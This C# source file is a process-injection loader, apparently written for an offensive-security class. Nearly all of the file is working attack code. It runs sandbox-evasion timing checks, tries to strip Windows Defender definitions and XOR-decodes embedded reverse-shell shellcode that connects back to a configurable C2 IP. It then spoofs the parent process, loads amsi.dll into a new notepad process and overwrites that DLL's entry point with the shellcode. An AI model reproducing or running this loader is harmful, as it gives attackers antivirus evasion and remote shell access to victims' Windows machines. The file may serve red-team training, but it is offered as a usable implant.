using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;
using Utility;

namespace dll_hollowing
{
    unsafe class Program
    {

        static void Main(string[] args)
        {
            String c2_ips = string.Empty;
            String dll_name = string.Empty;    
            if (args.Length != 2)
            {
                Console.WriteLine("Usage:: Innject_c2.exe <c2 ip> <dll name>");
                c2_ips = "192.168.49.115";
                dll_name = "amsi.dll";
            }
            else
            {
                c2_ips = args[0];
                dll_name = args[1];
            }
            Console.WriteLine("[*] Using c2 IP of {0}, and dll name {1}", c2_ips, dll_name);

			var c2_addr = IPAddress.Parse( c2_ips );

/*************************/
//          This is anti AV code from class
/*************************/
            IntPtr mem = Utility.Win32.VirtualAllocExNuma(Utility.Win32.GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0x0 );
            if (mem == IntPtr.Zero)
            {
                Console.WriteLine("Failed memory alloc");
                return;
            }

            DateTime t1 = DateTime.Now;
            Utility.Win32.Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5 ) 
            { 
                Console.WriteLine("Failed Time Check: {0} < 1.5", t2);
                return; 
            }

            try
            {
                string signature = "cmd /c \"c:\\Program Files\\Windows Defender\\MpCmdrun.exe\" -RemoveDefinitions -All";
                Process.Start( signature );
            }catch (Exception)
            {
            }
/*************************/
//          End Anti AV code 
/*************************/

/*************************/
//          Begin Shellcode deobfuscation
/*************************/
			byte[] bytes_ip = c2_addr.GetAddressBytes();
            // Xor'd values of a Reverse HTTPS connection on port 443 for x64. IP address has been zeroed out and replaced below after decodeing
//            byte[] encoded = new byte[743] { 0xc9, 0xd1, 0x62, 0xd1, 0x69, 0x09, 0xf9, 0x99, 0xe1, 0x35, 0xd8, 0xb0, 0x74, 0xc9, 0xb3, 0x64, 0xd1, 0xd0, 0xe7, 0xcf, 0x84, 0x7d, 0x12, 0xb3, 0x55, 0xd1, 0x6a, 0x67, 0x81, 0xa9, 0xbe, 0xcb, 0xc1, 0x7d, 0x96, 0x56, 0x7f, 0xd3, 0xac, 0x04, 0x50, 0xa9, 0xbe, 0xeb, 0xb1, 0x7d, 0xa8, 0x21, 0x99, 0xa5, 0x80, 0x49, 0x9b, 0xcd, 0x15, 0xd8, 0x20, 0xfc, 0x94, 0xa0, 0x34, 0x58, 0x03, 0xd8, 0xcb, 0xa9, 0xbe, 0xcb, 0xc1, 0xbe, 0xdb, 0xdd, 0x74, 0xc8, 0xa9, 0x34, 0x49, 0x87, 0xb4, 0xe1, 0xf9, 0x3e, 0x9b, 0xee, 0xb0, 0xeb, 0xe1, 0x35, 0x99, 0x6a, 0xb5, 0x11, 0xe1, 0x35, 0x99, 0xa9, 0xb0, 0x59, 0x95, 0x52, 0xd1, 0xe0, 0xe5, 0x12, 0xa9, 0x2d, 0xdd, 0x6a, 0x75, 0xb9, 0xb1, 0x7c, 0x98, 0x31, 0xd6, 0xcf, 0xa9, 0xca, 0x50, 0xac, 0x04, 0x50, 0xa0, 0xbe, 0xad, 0x69, 0x7d, 0x98, 0x37, 0x7d, 0xa8, 0x21, 0x74, 0x58, 0x28, 0x38, 0x35, 0xa0, 0x34, 0x58, 0xd9, 0xd5, 0xec, 0x10, 0x79, 0x9a, 0xad, 0x11, 0x91, 0xa4, 0x0c, 0x48, 0x94, 0xed, 0xc1, 0xa5, 0xbe, 0xd9, 0xc5, 0x7c, 0x98, 0x31, 0x53, 0xd8, 0x6a, 0x39, 0xd1, 0xa5, 0xbe, 0xd9, 0xfd, 0x7c, 0x98, 0x31, 0x74, 0x12, 0xe5, 0xbd, 0xd8, 0xb9, 0x74, 0xc1, 0xa9, 0x34, 0x49, 0xbf, 0x6c, 0xc3, 0xa0, 0x6d, 0xd8, 0xb8, 0x74, 0xc3, 0xa9, 0xb6, 0x75, 0xc1, 0x74, 0xcb, 0x1e, 0xd5, 0xc1, 0xa0, 0x6c, 0xc3, 0xa9, 0xbe, 0x8b, 0x08, 0x7e, 0x66, 0x1e, 0xca, 0xc4, 0xa9, 0x04, 0x42, 0xb2, 0x7c, 0x27, 0x96, 0x5c, 0xf7, 0x88, 0x5b, 0xfc, 0x95, 0x35, 0xd8, 0xb7, 0x7d, 0x10, 0x00, 0x7c, 0x5e, 0x23, 0x79, 0xee, 0xc7, 0x32, 0x66, 0x34, 0x66, 0xca, 0xa9, 0xbc, 0x78, 0xb2, 0x6f, 0xd4, 0xd0, 0xf5, 0xd4, 0xd0, 0xfc, 0xca, 0xb2, 0x7c, 0x23, 0xdb, 0x63, 0xe0, 0x46, 0x35, 0x99, 0xe1, 0x35, 0x66, 0x34, 0xdd, 0x89, 0xe1, 0x35, 0x99, 0xe1, 0x35, 0x99, 0xe1, 0x35, 0x99, 0xe1, 0x35, 0x99, 0xe1, 0x35, 0x99, 0xe1, 0x35, 0x99, 0xe1, 0x6f, 0xd1, 0x68, 0xf4, 0xd0, 0x26, 0xf5, 0x22, 0xe0, 0x35, 0x99, 0xac, 0x04, 0x50, 0xb2, 0x66, 0xf3, 0xe2, 0x66, 0xd0, 0x5b, 0x62, 0x10, 0x7e, 0xf3, 0x99, 0xe1, 0x35, 0x99, 0x1e, 0xe0, 0x71, 0x5d, 0x35, 0x99, 0xe1, 0x1a, 0xab, 0xac, 0x76, 0xc8, 0xbe, 0x60, 0xee, 0x97, 0x7f, 0xcb, 0xb3, 0x6a, 0xe1, 0xd2, 0x02, 0xdf, 0xa9, 0x47, 0xc1, 0xa3, 0x73, 0xee, 0xd7, 0x02, 0xdb, 0xd5, 0x6c, 0xf6, 0xa4, 0x57, 0xa8, 0x99, 0x72, 0xd0, 0x82, 0x7e, 0xd3, 0xa0, 0x5a, 0xdf, 0x8f, 0x70, 0xa1, 0xd4, 0x51, 0xf4, 0x8e, 0x5c, 0xd3, 0xd5, 0x74, 0xca, 0xd0, 0x5f, 0xec, 0x8c, 0x65, 0xea, 0xab, 0x51, 0xd1, 0x87, 0x46, 0xd7, 0x91, 0x60, 0xf2, 0xd2, 0x4c, 0xa9, 0x97, 0x65, 0xee, 0xd7, 0x5c, 0xb4, 0xab, 0x50, 0xd6, 0x86, 0x5c, 0xd3, 0x93, 0x44, 0xa0, 0x94, 0x71, 0xd4, 0x93, 0x43, 0xdc, 0xa8, 0x73, 0xb4, 0x8a, 0x7f, 0xe9, 0xa9, 0x4d, 0xc6, 0xa4, 0x03, 0xe3, 0x8f, 0x46, 0xfa, 0xaf, 0x5c, 0xdd, 0xac, 0x65, 0xd5, 0x8d, 0x7a, 0xae, 0xa8, 0x07, 0xf7, 0xac, 0x6c, 0xc3, 0x93, 0x7d, 0xed, 0xb8, 0x6c, 0xe9, 0xd3, 0x7e, 0xeb, 0xa5, 0x0d, 0xcf, 0xa0, 0x06, 0xdb, 0xa5, 0x0d, 0xc0, 0x83, 0x53, 0xc9, 0xa3, 0x61, 0xd1, 0xd0, 0x58, 0xe9, 0x82, 0x76, 0xf2, 0x8d, 0x5c, 0xf5, 0xa5, 0x66, 0xd4, 0xa6, 0x58, 0xc8, 0xa2, 0x6f, 0xce, 0xa8, 0x6c, 0xd2, 0xa5, 0x4c, 0xd1, 0x98, 0x6c, 0xed, 0xd9, 0x79, 0xe0, 0xa9, 0x47, 0xdd, 0xa8, 0x4c, 0xcb, 0x8d, 0x6f, 0xed, 0x8a, 0x77, 0x99, 0xa9, 0xbc, 0x58, 0xb2, 0x6f, 0xd8, 0xb9, 0x78, 0xa8, 0x28, 0x66, 0xd1, 0x59, 0x35, 0xab, 0x49, 0xb1, 0x99, 0xe1, 0x35, 0x99, 0xb1, 0x66, 0xca, 0xa8, 0xf2, 0x5b, 0x0a, 0x60, 0xb7, 0xda, 0xca, 0x4c, 0xa9, 0xbc, 0x5f, 0x8b, 0x3f, 0xc6, 0xa9, 0xbc, 0x68, 0x8b, 0x2a, 0xc3, 0xb3, 0x5d, 0x19, 0xd2, 0x35, 0x99, 0xa8, 0xbc, 0x79, 0x8b, 0x31, 0xd8, 0xb8, 0x7c, 0x23, 0x94, 0x73, 0x07, 0x67, 0x35, 0x99, 0xe1, 0x35, 0x66, 0x34, 0x78, 0xa8, 0x21, 0x66, 0xc3, 0xa9, 0xbc, 0x68, 0xac, 0x04, 0x50, 0xac, 0x04, 0x50, 0xb2, 0x66, 0xd0, 0x26, 0xf7, 0xb4, 0xe7, 0x2d, 0xe2, 0x1e, 0xe0, 0x1c, 0x21, 0x40, 0x86, 0xa9, 0xf2, 0x58, 0x69, 0x26, 0x99, 0xe1, 0x7c, 0x23, 0xa5, 0xc5, 0xac, 0x01, 0x35, 0x99, 0xe1, 0x35, 0x66, 0x34, 0x7d, 0x66, 0x2e, 0x41, 0x9b, 0x0a, 0x9f, 0x71, 0xb4, 0x35, 0x99, 0xe1, 0x66, 0xc0, 0x8b, 0x75, 0xc3, 0xa8, 0xbc, 0x48, 0x20, 0xd7, 0x89, 0xa8, 0xf2, 0x59, 0xe1, 0x25, 0x99, 0xe1, 0x7c, 0x23, 0xb9, 0x91, 0xca, 0x04, 0x35, 0x99, 0xe1, 0x35, 0x66, 0x34, 0x7d, 0x0a, 0xb2, 0x66, 0xd1, 0x68, 0xd2, 0xd1, 0x68, 0xc4, 0xd1, 0x68, 0xef, 0xd0, 0x26, 0xf5, 0x99, 0xc1, 0x35, 0x99, 0xa8, 0xbc, 0x60, 0xa8, 0x8f, 0x8b, 0x77, 0xbc, 0x7b, 0xe1, 0x35, 0x99, 0xe1, 0xca, 0x4c, 0xa9, 0xb6, 0x5d, 0xc1, 0xb0, 0x59, 0x95, 0x87, 0xff, 0x6a, 0x32, 0xd1, 0xe0, 0xf6, 0x1c, 0x21, 0x40, 0x4b, 0xb9, 0xf6, 0xc1, 0x8b, 0x35, 0xc0, 0xa8, 0xf2, 0x5b, 0x11, 0x80, 0x3b, 0xb7, 0xca, 0x4c };
			// XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP 
			byte[] encoded = new byte[460] { 0xC9, 0xD1, 0x62, 0xD1, 0x69, 0x9, 0xF5, 0x99, 0xE1, 0x35, 0xD8, 0xB0, 0x74, 0xC9, 0xB3, 0x64, 0xCF, 0xA9, 0x4, 0x4B, 0x84, 0x7D, 0x12, 0xB3, 0x55, 0xD1, 0x6A, 0x67, 0x81, 0xA9, 0xBE, 0xCB, 0xC1, 0x7D, 0x12, 0x93, 0x65, 0xD1, 0xEE, 0x82, 0xD3, 0xAB, 0x78, 0xA8, 0x28, 0x7D, 0xA8, 0x21, 0x99, 0xA5, 0x80, 0x49, 0x9B, 0xCD, 0x15, 0xD8, 0x20, 0xFC, 0x94, 0xA0, 0x34, 0x58, 0x3, 0xD8, 0xCB, 0xA0, 0x64, 0xD1, 0x6A, 0x67, 0xB9, 0x6A, 0x77, 0xA5, 0xA9, 0x34, 0x49, 0x6A, 0xB5, 0x11, 0xE1, 0x35, 0x99, 0xA9, 0xB0, 0x59, 0x95, 0x52, 0xD1, 0xE0, 0xE5, 0xC9, 0x6A, 0x7D, 0x81, 0xA5, 0xBE, 0xD9, 0xC1, 0x7C, 0x98, 0x31, 0xD6, 0xCF, 0xA9, 0xCA, 0x50, 0xA0, 0xBE, 0xAD, 0x69, 0x7D, 0x98, 0x37, 0x78, 0xA8, 0x28, 0x7D, 0xA8, 0x21, 0x99, 0xD8, 0x20, 0xFC, 0x94, 0xA0, 0x34, 0x58, 0xD9, 0xD5, 0xEC, 0x10, 0x79, 0x9A, 0xAD, 0x11, 0x91, 0xA4, 0xC, 0x48, 0x94, 0xED, 0xC1, 0xA5, 0xBE, 0xD9, 0xC5, 0x7C, 0x98, 0x31, 0x53, 0xD8, 0x6A, 0x39, 0xD1, 0xA5, 0xBE, 0xD9, 0xFD, 0x7C, 0x98, 0x31, 0x74, 0x12, 0xE5, 0xBD, 0xD1, 0xE0, 0xE5, 0xD8, 0xB9, 0x74, 0xC1, 0xBF, 0x6C, 0xC3, 0xA0, 0x6D, 0xD8, 0xB8, 0x74, 0xC3, 0xA9, 0xB6, 0x75, 0xC1, 0x74, 0xCB, 0x1E, 0xD5, 0xC1, 0xA0, 0x6C, 0xC3, 0xA9, 0xBE, 0x8B, 0x8, 0x62, 0x66, 0x1E, 0xCA, 0xC4, 0xA8, 0x8B, 0xEE, 0x92, 0x7, 0xC6, 0xD2, 0x7, 0x99, 0xE1, 0x74, 0xCF, 0xA8, 0xBC, 0x7F, 0xA9, 0xB4, 0x75, 0x41, 0x34, 0x99, 0xE1, 0x7C, 0x10, 0x4, 0x7C, 0x25, 0xE3, 0x35, 0x88, 0xBD, 0xF5, 0x31, 0x29, 0xE9, 0xD8, 0xB5, 0x7C, 0x10, 0x5, 0x79, 0x10, 0x10, 0x74, 0x23, 0xAD, 0x42, 0xBF, 0xE6, 0xCA, 0x4C, 0xAD, 0xBC, 0x73, 0x89, 0x34, 0x98, 0xE1, 0x35, 0xC0, 0xA0, 0x8F, 0xB0, 0x61, 0x5E, 0x99, 0x1E, 0xE0, 0xC9, 0xB1, 0x78, 0xA8, 0x28, 0x78, 0xA8, 0x21, 0x7D, 0x66, 0x21, 0x7D, 0x10, 0x23, 0x7D, 0x66, 0x21, 0x7D, 0x10, 0x20, 0x74, 0x23, 0xB, 0x3A, 0x46, 0x1, 0xCA, 0x4C, 0xA9, 0xBC, 0x5E, 0x8B, 0x25, 0xD8, 0xB9, 0x79, 0x10, 0x3, 0x7D, 0x10, 0x18, 0x74, 0x23, 0x78, 0x90, 0xED, 0x80, 0xCA, 0x4C, 0xA9, 0xB4, 0x5D, 0xA1, 0x37, 0x99, 0xE1, 0x7C, 0x21, 0x82, 0x58, 0xFD, 0xE1, 0x35, 0x99, 0xE1, 0x35, 0xD8, 0xB1, 0x74, 0xC9, 0xA9, 0xBC, 0x7B, 0xB6, 0x62, 0xCE, 0xAC, 0x4, 0x59, 0x8B, 0x38, 0xC0, 0xA0, 0x65, 0x7B, 0x1D, 0x53, 0x5E, 0xA5, 0x11, 0xCD, 0xE0, 0x34, 0xD1, 0x6C, 0x71, 0xBD, 0xF9, 0xF3, 0x99, 0x89, 0x7D, 0x10, 0x7, 0x63, 0xC9, 0xA0, 0x65, 0xD8, 0xB1, 0x74, 0xC9, 0xA8, 0xCA, 0x59, 0xA0, 0x65, 0xD0, 0x1E, 0xFD, 0xD4, 0x68, 0xF4, 0xD5, 0x68, 0xF4, 0xD8, 0x5B, 0x4C, 0x55, 0xDE, 0xB3, 0x66, 0x34, 0x7D, 0xA8, 0x33, 0x7D, 0x66, 0x2B, 0xBE, 0x97, 0xA0, 0x8F, 0x91, 0x66, 0x28, 0xF9, 0x1E, 0xE0, 0x22, 0x11, 0x80, 0x3B, 0xB7, 0x74, 0x23, 0x47, 0xA0, 0x24, 0x7C, 0xCA, 0x4C, 0xA9, 0xB6, 0x5D, 0xC9, 0x9, 0x9F, 0x9D, 0x3F, 0x19, 0x1A, 0xD5, 0xEC, 0xE4, 0x8E, 0xDE, 0xF2, 0x47, 0xF6, 0x8B, 0x35, 0xC0, 0xA0, 0xBC, 0x43, 0x1E, 0xE0};
            int encoded_size = encoded.Length;
            byte[] xor = new byte[3] { 0x35, 0x99, 0xe1 };
            int xor_size = xor.Length;
                
            byte[] buf = new byte[encoded_size];
			int base_offset = -1;
            for(int i = 0; i < encoded_size; i++)
            {
                buf[i] = (byte)(encoded[i]^xor[i%xor_size]);
				if (base_offset == -1 && i > 3 && (buf[i-3]&0xff) == 0xc0 && (buf[i-2]&0xff) == 0xa8 && (buf[i-1]&0xff) == 0xc8 && (buf[i]&0xff) == 0xdc) 
				{ 
					base_offset = i-3;
				}
            }
            for (int offset = 0x0; offset < bytes_ip.Length; offset = offset + 1)
            {
                buf[base_offset + offset] = bytes_ip[offset];
            }
/*************************/
//          End Shellcode deobfuscation
/*************************/

/*************************/
//          Begin PPID Spoofing
/*************************/
			var startInfoEx = new Utility.Win32.STARTUPINFOEX();
			var processInfo = new Utility.Win32.PROCESS_INFORMATION();
			var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);

            var processSecurity = new Utility.Win32.SECURITY_ATTRIBUTES();
            var threadSecurity = new Utility.Win32.SECURITY_ATTRIBUTES();
            processSecurity.nLength = Marshal.SizeOf(processSecurity);
            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
            var lpSize = IntPtr.Zero;
            Utility.Win32.InitializeProcThreadAttributeList( IntPtr.Zero, 2, 0, ref lpSize);
            startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            Utility.Win32.InitializeProcThreadAttributeList( startInfoEx.lpAttributeList, 2, 0, ref lpSize);

            Marshal.WriteIntPtr( lpValue, new IntPtr((long)Utility.Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));

            Utility.Win32.UpdateProcThreadAttribute( startInfoEx.lpAttributeList, 0, (IntPtr)Utility.Win32.ProcThreadAttribute.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            var parentHandle = IntPtr.Zero;
            string[] processes = {"explorer", "services","svchosts"};
            foreach (string process in processes)
            {
               try
                {
                    Console.WriteLine("trying Parent:: " + process);
                    parentHandle = Process.GetProcessesByName(process)[0].Handle;
                }
                catch (Exception)
                {
                    continue;
                }
                break;
            }
            if (parentHandle != IntPtr.Zero)
            {
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                Utility.Win32.UpdateProcThreadAttribute( startInfoEx.lpAttributeList, 0, (IntPtr)Utility.Win32.ProcThreadAttribute.PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
            }

            Utility.Win32.CreateProcess( null, "notepad", ref processSecurity, ref threadSecurity, false, Utility.Win32.CreationFlags.ExtendedStartupInfoPresent | Utility.Win32.CreationFlags.DetachedProcess, IntPtr.Zero, null, ref startInfoEx, out processInfo);

/*************************/
//          End PPID Spoofing
/*************************/


// Loadlibrary(amsi.dll)
// Parse out the entry point to the amsi.dll 
// Change memory permissions for the are to allow read write
// Write shellcode to the entry point
// Change memory permissions for the entrypoint to the original value
// Create a new thread executing the entrypoint of the amsi.dll
// Loop for exit. Shellcode only runs when this program is open
 
/*************************/
// Load the requested Library  
/*************************/

            IntPtr hProcess = processInfo.hProcess;

            // allocate memory, into the remote process memory, for the name of the dll to inject
            IntPtr remoteDLLInjectName = Utility.Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dll_name.Length, (uint)0x1000, (uint)4); // 0x4 == PAGE_READWRITE
            if ( remoteDLLInjectName == IntPtr.Zero) goto EXIT;
            Console.WriteLine("[*] {0}: Dll Name Address in Remote Process: 0x{1:X}", dll_name, (Int64)remoteDLLInjectName);

            IntPtr zero = IntPtr.Zero;
            // copy, into the remote process memory, the name of the dll to inject
            Utility.Win32.WriteProcessMemory(hProcess, remoteDLLInjectName, Encoding.Default.GetBytes(dll_name), dll_name.Length, out zero);

            IntPtr hKernel32 = Utility.Win32.GetModuleHandleA("Kernel32");
            if ( hKernel32 == IntPtr.Zero) goto EXIT;

            IntPtr loadlibrary_addr = Utility.Win32.GetProcAddress(hKernel32, "LoadLibraryA");
            IntPtr hDllThread = Utility.Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadlibrary_addr, remoteDLLInjectName, 0, out zero);
            if ( hDllThread == IntPtr.Zero) goto EXIT;

            Utility.Win32.WaitForSingleObject(hDllThread, 1000);

            // Loop through loaded modules lookin for the one we just created
            long[] module_array = new long[0x100];
            uint module_sz = 0;
            Utility.Win32.EnumProcessModules(hProcess, module_array, (uint)module_array.Length, out module_sz);
            int number_of_modules = (int)(module_sz / 8);

            IntPtr hModule = IntPtr.Zero;
            StringBuilder moduleName = new StringBuilder();
            for (int i = 0; i < number_of_modules; i++) 
            {
                hModule = new IntPtr(module_array[i]);
                Utility.Win32.GetModuleBaseName(hProcess, hModule, moduleName, (uint)0x100);
                if (Utility.Win32.strcmp(moduleName.ToString(), "amsi.dll") == true) break;
            }

            if (hModule == IntPtr.Zero) goto EXIT;

            // get DLL's AddressOfEntryPoint
            uint remoteProcessMemory_sz = 0x1000;
            IntPtr remoteProcessMemory = Utility.Win32.VirtualAllocExNuma(Utility.Win32.GetCurrentProcess(), IntPtr.Zero, remoteProcessMemory_sz, 0x3000, 0x4, 0x0 );
            if (remoteProcessMemory == IntPtr.Zero) goto EXIT;

            Utility.Win32.ReadProcessMemory(hProcess, hModule, remoteProcessMemory , (int)remoteProcessMemory_sz, out zero);

            Console.WriteLine("[*] Local Address of the copy of remote Address: 0x{0:X} 0x{1:X}", (Int64)remoteProcessMemory, (Int64)hModule);
            Utility.Win32.IMAGE_DOS_HEADER* mz_header = (Utility.Win32.IMAGE_DOS_HEADER*)remoteProcessMemory;	
            Console.WriteLine("[*] {0} mz header PE OFffset 0x{1:X}", dll_name, mz_header->e_lfanew);
            Utility.Win32.IMAGE_NT_HEADERS64* pe_header = (Utility.Win32.IMAGE_NT_HEADERS64*)((UInt64)remoteProcessMemory + (UInt64)(mz_header->e_lfanew));
            Console.WriteLine("[*] {0} pe_header address 0x{1:X}", dll_name, (Int64)pe_header);
            Console.WriteLine("[*] {0} EntryPoint offset 0x{1:X}", dll_name, pe_header->OptionalHeader.AddressOfEntryPoint);
            IntPtr entryPoint = (IntPtr)(pe_header->OptionalHeader.AddressOfEntryPoint + (UInt64)hModule);
            Console.WriteLine("[*] Dll entryPoint at: 0x{0:X}\n", entryPoint);

            // Overwrite the DLL's entry point with the decoded shellcode
            if (Utility.Win32.WriteProcessMemory(hProcess, entryPoint, buf, encoded_size, out zero)) 
            {
                // execute shellcode from inside the benign DLL
                Utility.Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, entryPoint, IntPtr.Zero, 0, out zero);
            }
EXIT:
            Console.WriteLine("END"); 
        }
    }

}
